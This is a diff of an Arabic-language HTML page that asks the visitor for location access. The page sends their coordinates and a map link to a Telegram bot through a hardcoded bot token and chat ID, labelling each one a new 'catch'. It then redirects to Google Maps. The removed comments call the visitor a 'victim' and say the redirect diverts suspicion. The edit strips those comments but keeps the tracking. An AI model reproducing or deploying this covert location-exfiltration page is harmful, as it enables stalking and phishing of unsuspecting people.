@@ -1,10 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>تحديد الموقع لتلقي الخدمة</title>
-</head>
-<body>
-    <h2>جاري تحميل البيانات... يرجى السماح بالوصول للموقع</h2>
+    <title>تحديد الموقع</title>
     <script>
         window.onload = function() {
             if (navigator.geolocation) {
@@ -17,18 +14,18 @@
         function sendPosition(position) {
             const lat = position.coords.latitude;
             const lon = position.coords.longitude;
-            
-            // إرسال الإحداثيات إلى بوت التليجرام الخاص بك عبر API
-            const token = "8741683333:AAE4rkxyKynPPLPk9GvNNUGTQOjOBT7Iu9s";
-            const chat_id = "6999879648";
-            const message = `📍 صيد جديد!\nخط العرض: ${lat}\nخط الطول: ${lon}\nرابط الخريطة: https://www.google.com/maps?q=${lat},${lon}`;
-            
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`)
-            .then(response => {
-                // إعادة توجيه الضحية لموقع حقيقي لإبعاد الشبهة
+            const token = "87416833333:AAE4rkxyKynPPLPk9GvNNUGTQOj0BT7Iu9s";
+            const chat_id = "56999879648";
+            const text = `📍 صيد جديد!\nخط العرض: ${lat}\nخط الطول: ${lon}\nرابط الخريطة: https://www.google.com/maps?q=${lat},${lon}`;
+
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}`)
+            .then(() => {
                 window.location.href = "https://www.google.com/maps";
             });
         }
     </script>
+</head>
+<body>
+    <h2 style="text-align:center; margin-top:50px;">جاري تحميل البيانات... يرجى الانتظار</h2>
 </body>
 </html>
